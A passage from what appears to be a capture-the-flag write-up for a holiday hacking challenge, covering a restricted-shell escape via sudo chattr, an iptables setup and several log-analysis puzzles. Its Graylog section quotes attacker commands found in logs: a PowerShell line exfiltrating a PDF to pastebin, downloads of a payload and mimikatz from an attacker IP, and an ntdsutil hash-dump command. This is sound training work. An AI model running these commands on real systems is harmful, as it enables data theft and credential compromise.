Microsoft.PowerShell.Commands.Internal.Format.FormatEntryData
Microsoft.PowerShell.Commands.Internal.Format.GroupEndData
Microsoft.PowerShell.Commands.Internal.Format.FormatEndData
```

This doesn't work

```
PS /home/elf> $myevent = $mylog | ? { $_.Id -match '1' }
PS /home/elf> $myevent.Properties | Format-List

Value : 

Value : 2019-11-07 17:59:56.525
Value : ba5c6bbb-5b9c-5dc4-0000-00107660a900
Value : 3664
Value : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Value : 10.0.14393.206 (rs1_release.160915-0644)
Value : Windows PowerShell
Value : Microsoft® Windows® Operating System
Value : Microsoft Corporation
Value : PowerShell.EXE
Value : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c 
        "`$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    N=4`n    Ne=22`n 
           Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    Rn=9`n}`n"

Value : C:\
Value : ELFURESEARCH\allservices
Value : ba5c6bbb-5b9c-5dc4-0000-0020f55ca900
Value : 11099381
Value : 0
Value : High
Value : MD5=097CE5761C89434367598B34FE32893B
Value : ba5c6bbb-4c79-5dc4-0000-001029350100
Value : 1008
Value : C:\Windows\System32\svchost.exe
Value : C:\Windows\system32\svchost.exe -k netsvcs
```

Finally:

```
PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/on).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:09 GMT                                                       
Content-Length: 32                                                                        

Christmas Cheer Laser Powered On
PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:15 GMT                                                       
Content-Length: 87                                                                        

Updated Lense Refraction Level - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:21 GMT                                                       
Content-Length: 82                                                                        

Updated Laser Temperature - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:26 GMT                                                       
Content-Length: 77                                                                        

Updated Mirror Angle - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf> (Invoke-WebRequest -Uri http://localhost:1225/api/gas -Method POST -Body "O=6&H=7&He=3&N=4&Ne=22&Ar=11&Xe=10&F=20&Kr=8&Rn=9").RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:32 GMT                                                       
Content-Length: 81                                                                        

Updated Gas Measurements - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:47 GMT                                                       
Content-Length: 199                                                                       

Success! - 5.428 Mega-Jollies of Laser Output Reached!
```

# Alabaster Snowball - NYANCAT Shell
Inside the shell

```
nyancat, nyancat
I love that nyancat!
My shell's stuffed inside one
Whatcha' think about that?

Sadly now, the day's gone
Things to do!  Without one...
I'll miss that nyancat
Run commands, win, and done!

Log in as the user alabaster_snowball with a password of Password2,
    and land in a Bash prompt.

Target Credentials:

username: alabaster_snowball
password: Password2
```

Some hints:

```
User's Shells
From: Alabaster Snowball
On Linux, a user's shell is determined by the contents of /etc/passwd

Chatter?
From: Alabaster Snowball
sudo -l says I can run a command as root. What does it do?
```

Let's apply them:

```
elf@e6d5f5ac3f24:~$ cat /etc/passwd
elf:x:1000:1000::/home/elf:/bin/bash
alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
```

`/bin/nsh` is immutable but we can remove it with `chattr`

```
elf@14a07541cd62:~$ lsattr /bin/nsh
----i---------e---- /bin/nsh
sudoelf@14a07541cd62:~$ chattr -i /bin/nsh
chattr: Permission denied while setting flags on /bin/nsh
elf@14a07541cd62:~$ sudo /usr/bin/chattr -i /bin/nsh
elf@14a07541cd62:~$ lsattr /bin/nsh
--------------e---- /bin/nsh
```

Everyone has rwx on `/bin/nsh`.

```
elf@14a07541cd62:~$ ls -alt /bin/nsh
-rwxrwxrwx 1 root root 75680 Dec 11 17:40 /bin/nsh
```

Now we can login.

```
elf@dff265704748:~$ su - alabaster_snowball
Password: 
Loading, please wait......

You did it! Congratulations!
```

# 2. Letter
Answer: `DEMAND`.

```
Date: February 28, 2019

To the Administration, Faculty, and Staff of Elf University
17 Christmas Tree Lane
North Pole

From: A Concerned and Aggrieved
Character Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical
Characters... OR ELSE!

Attention All Elf University Personnel,

It remains a constant source of frustration that Elf University and the entire
operation at the North Pole focuses exclusively on Mr. S. Claus and his year-end
holiday spree. We URGE you to consider lending your considerable resources and
expertise in providing merriment, cheer, toys, candy, and much more to other
holidays year-round, as well as to other mythical characters. For centuries, we
have expressed our frustration at your lack of willingness to spread your cheer
beyond the inaptly-called “Holiday Season.” There are many other perfectly fine
holidays and mythical characters that need your direct support year-round.

If you do not accede to our demands, we will be forced to take matters into our
own hands.  We do not make this threat lightly. You have less than six months to
act demonstrably.

Sincerely,

--A Concerned and Aggrieved Character
```

Is there anything in this letter?

Answer to question 2: `DEMAND`

# Tangle Coalbox - Frosty Keypad
`7331` is prime.

# Pepper Minstix - Graylog
Actual page that can be opened in the browser:

* https://graylog.elfu.org/

## Questions

### Question 1
What is the full-path + filename of the first malicious file downloaded by Minty?

* Answer `C:\Users\minty\Downloads\cookie_recipe.exe`

Search for `recipe` and one message pops up.

```powershell
CommandLine
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri
https://pastebin.com/post.php -Method POST -Body @{ "submit_hidden" =
"submit_hidden"; "paste_code" =
$([Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf")));
"paste_format" = "1"; "paste_expire_date" = "N"; "paste_private" = "0";
"paste_name"="cookie recipe" }
```

`C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf`

This is for alabaster and not what we want.

Searching for `minty` brings up a lot of results but if we search for it in the
results in the browser with `ctrl+f` we can see the downloaded file:

`C:\Users\minty\Downloads\cookie_recipe.exe`

### Question 2
The malicious file downloaded and executed by Minty gave the attacker remote
access to his machine. What was the ip:port the malicious file connected to
first?

* Answer `192.168.247.175:4444`

Searching for `cookie_recipe.exe` we can then click on `EventID` to the left and
then click on `Quick Values` to bring up a chart. Then we can click on the
magnifying glass besides each value to filter by that event ID.

* `cookie_recipe.exe AND EventID:2` is when Firefox created the downloaded file.
* `cookie_recipe.exe AND EventID:3` is what we want.

```
message

elfu-res-wks1 MSWinEventLog 1   Microsoft-Windows-Sysmon/Operational    2441
Tue Nov 19 05:24:04 2019    3   Microsoft-Windows-Sysmon    SYSTEM  User
Information elfu-res-wks1   Network connection detected (rule: NetworkConnect)
Network connection detected:  RuleName:   UtcTime: 2019-11-19 13:24:03.757
ProcessGuid: {BA5C6BBB-ECF2-5DD3-0000-001086363300}  ProcessId: 5256  Image:
C:\Users\minty\Downloads\cookie_recipe.exe  User: ELFU-RES-WKS1\minty  Protocol:
tcp  Initiated: true  SourceIsIpv6: false  SourceIp: 192.168.247.177
SourceHostname: elfu-res-wks1.localdomain  SourcePort: 53564  SourcePortName:
DestinationIsIpv6: false  DestinationIp: 192.168.247.175  DestinationHostname:
DEFANELF  DestinationPort: 4444  DestinationPortName:    20132
```

`192.168.247.175:4444`

### Question 3
What was the first command executed by the attacker?

* (answer is a single word) `whoami`

Searching for `cookie_recipe` and looking at timestamps, the first action after
`Tue Nov 19 05:24:04 2019` that we saw above is `C:\Windows\system32\cmd.exe /c "whoami "`

### Question 4
What is the one-word service name the attacker used to escalate privileges?

* Answer `webexservice`

```
C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri
    http://192.168.247.175/cookie_recipe2.exe -OutFile cookie_recipe2.exe "

C:\Windows\system32\cmd.exe /c "sc start webexservice a software-update 1 
wmic process call create "cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe" "
```

### Question 5
What is the file-path + filename of the binary ran by the attacker to dump
credentials?

* Answer `C:\cookie.exe`

```powershell
C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20190813/mimikatz_trunk.zip
-OutFile cookie.zip "
```

Searching for `mimikatz` we find another event. It say the original file name of
`cookie.exe` was `mimikatz`. Seems like it was renamed sometime.

`C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe "`

### Question 6
The attacker pivoted to another workstation using credentials gained from
Minty's computer. Which account name was used to pivot to another machine?

* Answer `alabaster`

https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf

```
event ID `4624`
LogonType: 10 == remote == RDP - Logon Type 10 – RemoteInteractive

EventID:4624 AND LogonType:10
```

There is only one event at `06:04:28`.

### Question 7
What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to
another machine?

* Answer `06:04:28`

### Question 8
The attacker navigates the file system of a third host using their Remote
Desktop Connection to the second host. What is the
SourceHostName,DestinationHostname,LogonType of this connection? (submit in that
order as csv)

* Answer `ELFU-RES-WKS2,ELFU-RES-WKS3,3`

Our info:

* Time: `2019-11-19 06:07:22.000`
* Filter: `SourceHostName:ELFU\-RES\-WKS2 AND DestinationHostname:elfu\-res\-wks3`

The attacker has GUI access to workstation 2 via RDP. They likely use this GUI
connection to access the file system of of workstation 3 using explorer.exe via
UNC file paths (which is why we don't see any cmd.exe or powershell.exe process
creates). However, we still see the successful network authentication for this
with event id 4624 and logon type 3.

### Question 9
What is the full-path + filename of the secret research document after being
transferred from the third host to the second host?

* Answer `C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf`

Our filter is: `ProcessImage:C\:\\Windows\\Explorer.EXE AND source:elfu\-res\-wks2`

Sorting by date, only one event is after the logon timestamp above.

```
CreationUtcTime
    2019-11-19T14:07:50.000Z
EventID
    2
ProcessId
    4372
ProcessImage
    C:\Windows\Explorer.EXE
TargetFilename
    C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf
WindowsLogType
Microsoft-Windows-Sysmon/Operational
```

### Question 10
What is the IPv4 address (as found in logs) the secret research document was
exfiltrated to?

* Answer `104.22.3.84`

Searching for `super_secret_elfu_research.pdf` there are 3 events.


```
2019-11-19 06:14:24.000

C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri
https://pastebin.com/post.php -Method POST -Body @{ "submit_hidden" =
"submit_hidden"; "paste_code" =
$([Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf")));
"paste_format" = "1"; "paste_expire_date" = "N"; "paste_private" = "0";
"paste_name"="cookie recipe" }
```

We know exfiltration was done with PowerShell from wks2 so our filter is:

* `SourceHostname:elfu\-res\-wks2.localdomain AND ProcessImage:C\:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe`

Which gives us one event.

```
DestinationHostname
    pastebin.com
DestinationIp
    104.22.3.84
DestinationPort
    80
EventID
    3
ProcessId
    1232
ProcessImage
    C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
Protocol
    tcp
SourceHostname
    elfu-res-wks2.localdomain
SourceIp
    192.168.247.177
SourcePort
53564
```

# Kent Tinseltooth - Smart Braces
`srf.elfu.org`

A proper configuration for the Smart Braces should be exactly:

1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the
   INPUT and the OUTPUT chains.
3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access
   the local SSH server (on port 22).
4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21
   and 80.
5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo
   interface.

Tutorial: https://wiki.centos.org/HowTos/Network/IPTables

1. Default policites to DROP
    * sudo iptables -P INPUT DROP
    * sudo iptables -P OUTPUT DROP
    * sudo iptables -P FORWARD DROP
2. Accept all connections that are established, related.
    * sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    * sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
3. Accept only one IP for SSH.
    * sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT
4. Have to match multiport to specify multiple ports in one rule
    * sudo iptables -A INPUT -p tcp --match multiport --dports 21,80 -j ACCEPT
5. Accept all output traffic going to port 80.
    * sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
6. Accept all traffic fromthe lo interface.
    * sudo iptables -A INPUT -i lo -j ACCEPT

# Find the Turtle Doves
They are in the student union area.

# 3. Windows Log Analysis: Evaluate Attack Outcome
We're seeing attacks against the Elf U domain! Using the event log data,
identify the user account that the attacker compromised using a password spray
attack. Bushy Evergreen is hanging out in the train station and may be able to
help you out.

* https://downloads.elfu.org/Security.evtx.zip

Bushy Evergreen says `DeepBlueCLI tool is useful`.

`.\DeepBlue.ps1 .\Security.evtx >> report.txt` and it spits out the report.

The tool gives `Multiple admin logons for one account` for three accounts but
only one of them appears in the `Password Spray Attack` prompts.

Answer: `supatree`

# 4. Windows Log Analysis: Determine Attacker Technique
Using these normalized Sysmon logs, identify the tool the attacker used to
retrieve domain password hashes from the lsass.exe process. For hints on
achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.

https://downloads.elfu.org/sysmon-data.json.zip

Mimikatz has a module named `lsadump`. Mimikatz does not appear in the logs but
the module might.

https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump

Maybe it's `procdump`. no it's not.

Search with `EQL` at https://eqllib.readthedocs.io/en/latest/guides/sysmon.html#example-searches-with-eql

This query did not work.

* https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html
* `file where file_name == "lsass*.dmp" and process_name != "werfault.exe"`

Looking here, https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/

we can see some tools. Goinmg through the tools, we get to `ntdsutil`. Searching
for it, we get to the last entry in the file which has our answer.

```json
{
        "command_line": "ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q",
        "event_type": "process",
        "logon_id": 999,
        "parent_process_name": "cmd.exe",
        "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
        "pid": 3556,
        "ppid": 3440,
        "process_name": "ntdsutil.exe",
        "process_path": "C:\\Windows\\System32\\ntdsutil.exe",
        "subtype": "create",
        "timestamp": 132186398470300000,
        "unique_pid": "{7431d376-dee7-5dd3-0000-0010f0c44f00}",
        "unique_ppid": "{7431d376-dedb-5dd3-0000-001027be4f00}",
        "user": "NT AUTHORITY\\SYSTEM",
        "user_domain": "NT AUTHORITY",
        "user_name": "SYSTEM"
    }
```

Answer: `ntdsutil`

# 5. Network Log Analysis: Determine Compromised System
The attacks don't stop! Can you help identify the IP address of the
malware-infected system using these Zeek logs? For hints on achieving this
objective, please visit the Laboratory and talk with Sparkle Redberry.

* https://downloads.elfu.org/elfu-zeeklogs.zip

Hint from Sparkle:

```
You got it - three cheers for cheer!
For objective 5, have you taken a look at our Zeek logs?
Something's gone wrong. But I hear someone named Rita can help us.
Can you and she figure out what happened?
```

Rita is a framework for network traffic analysis and can ingest Zeek logs.

* https://github.com/activecm/rita

Seems like we might not have needed to install rita because the logs have the
html report.

Following the video here, HTML report is discussed at:

* https://youtu.be/JoWzkcEotA8?t=350

Open the `ELFU/index.html` file and click on `Beacons`. Then we will see one
node (`192.168.134.130`) with almost a perfect score (`0.998`). Has a lot of
connections (`7660`) and goes to a weird IP address (`144.202.46.214`).

```
Score	Source	Destination	Connections	Avg. Bytes	Intvl. Range	Size Range	Intvl. Mode	Size Mode	Intvl. Mode Count	Size Mode Count	Intvl. Skew	Size Skew	Intvl. Dispersion	Size Dispersion
0.998	192.168.134.130	144.202.46.214	7660	1156.000	10	683	10	563	6926	7641	0.000	0.000	0	0
```

There's nothing in Blacklists (`BL Source IPs` `BL Dest. IPs` and `BL Hostnames`).

This was our answer `192.168.134.130`.
